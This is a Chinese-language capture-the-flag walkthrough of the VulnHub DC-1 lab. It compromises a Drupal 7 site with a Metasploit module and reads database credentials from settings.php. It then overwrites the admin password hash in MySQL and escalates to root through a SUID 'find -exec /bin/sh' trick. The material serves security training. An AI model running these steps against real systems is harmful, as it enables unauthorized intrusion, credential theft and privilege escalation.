## 复盘 *

## 靶机地址

[DC: 1 ~ VulnHub](https://www.vulnhub.com/entry/dc-1,292/)



![image-20250308200123888](./assets/image-20250308200123888.png)





## 信息收集

### 主机探测

```
arp-scan -l
```



![image-20250308200145452](./assets/image-20250308200145452.png)

确定目标主机ip

192.168.6.24





### nmap扫描目标主机开放端口

```
nmap -sS -sV -p- -Pn 192.168.6.24
```

![image-20250308200218884](./assets/image-20250308200218884.png)

- 22 ssh服务
- 80 tcp服务





访问192.168.6.24

登录页面



### 利用Wappalyzer识别CMS

drupal 7

![image-20250308200313716](./assets/image-20250308200313716.png)



### 利用whatweb识别网站指纹信息

```
whatweb -v 192.168.6.24
```

![image-20250308200352569](./assets/image-20250308200352569.png)





### dirsearch扫描目录

```
dirsearch -u 192.168.6.24
```

存在

- robots.txt
- README.txt

![image-20250308200401344](./assets/image-20250308200401344.png)

访问

无敏感信息

![image-20250308200609118](./assets/image-20250308200609118.png)



## 漏洞利用



### searchsploit搜索可利用漏洞

```
searchsploit drupal
```

![image-20250308200617367](./assets/image-20250308200617367.png)

看一下msf中有没有可用漏洞



###  进入msfconsole

```
msfconsole
search drupal
```

![image-20250308200624777](./assets/image-20250308200624777.png)

选用1

```
use 1
```

设置目标ip

```
set rhost 192.168.6.24
```

运行

```
run
```

![image-20250308200632662](./assets/image-20250308200632662.png)

![image-20250308200635411](./assets/image-20250308200635411.png)

进入shell

```
Shell
```



### python转换终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```



查看当前用户

```
whoami
```

查看当前目录

```
ls
```

存在flag1.txt

查看

```
cat flag1.txt
```

![image-20250308200728716](./assets/image-20250308200728716.png)

翻译：好的CMS需要一个config文件，你也一样

 

### 查找Drupal的默认配置文件

/var/www/sites/default/settings.php

```
cd /var/www/sites/default

ls

cat settings.php
```

![image-20250308200740735](./assets/image-20250308200740735.png)

![image-20250308200744840](./assets/image-20250308200744840.png)

提示暴力破解和字典攻击不是唯一的方法，提示可以使用其他方式来利用漏洞或配置错误。

 

 

得到mysql账号和密码



### 尝试登录mysql

```
mysql -u dbuser -p

R0ck3t
```

![image-20250308200807250](./assets/image-20250308200807250.png)



查看所有数据库

```
show databases;
```

![image-20250308200815815](./assets/image-20250308200815815.png)



进入drupaldb数据库

```
use drupaldb
```

![image-20250308200828716](./assets/image-20250308200828716.png)



查看所有的表

```
Show tables;
```

![image-20250308200836833](./assets/image-20250308200836833.png)![image-20250308200841347](./assets/image-20250308200841347.png)

存在users表

查看



找到两个用户

```
admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR 

Fred | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg 
```



查了资料发现Drupal加密方式是不可逆的，但是可通过其他方式修改密码

[分享：忘记Drupal的管理员密码的解决办法 | Drupal China](https://drupalchina.cn/node/2128)

![image-20250308200859349](./assets/image-20250308200859349.png)



### 尝试修改admin密码

找到password-hash.sh文件

![image-20250308200907280](./assets/image-20250308200907280.png)



在var/www/scripts目录下执行

```
password-hash.sh 123456
```

报错

![image-20250308200916459](./assets/image-20250308200916459.png)

但是在上一级目录下执行

```
scripts/password-hash.sh 123456
```

可以

![image-20250308200923683](./assets/image-20250308200923683.png)



重新登录mysql

修改admin和Fred密码

```
update users set pass="$S$DnRP9LdUoPe8Id4j6/QJxmoTHIjnb8X9TVSgruNEUrUx94UwYddg" where name="admin" or name="Fred";
```



### 利用admin登录后台

![image-20250308200939900](./assets/image-20250308200939900.png)



发现flag3

![image-20250308200946467](./assets/image-20250308200946467.png)

![image-20250308200950549](./assets/image-20250308200950549.png)



![image-20250308200954390](./assets/image-20250308200954390.png)



### 查看/etc/passwd文件

```
cat /etc/passwd
```

![image-20250308201000995](./assets/image-20250308201000995.png)



查看flag4.txt

![image-20250308201007719](./assets/image-20250308201007719.png)



![image-20250308201011878](./assets/image-20250308201011878.png)



![image-20250308201015697](./assets/image-20250308201015697.png)



## 提权



### suid位查找

```
find /-perm -u=s -type f 2>/dev/null
```

![image-20250308201024726](./assets/image-20250308201024726.png)



### 尝试使用find提权

执行

```
find . -exec /bin/sh \;
```

![image-20250308201051651](./assets/image-20250308201051651.png)

得到root权限

![image-20250308201031590](./assets/image-20250308201031590.png)

![image-20250308201104556](./assets/image-20250308201104556.png)



进入root目录

发现最后一个flag

thefinalflag.txt

![image-20250308201111291](./assets/image-20250308201111291.png)



![image-20250308201114088](./assets/image-20250308201114088.png)


# 二次复盘

发现是drupal CMS，7.0版本，searchsploit查找相关漏洞，有一个sql注入添加admin账户的exp，添加admin账户，登录后台

添加php插件

content写入php反弹shell脚本，然后find提权即可
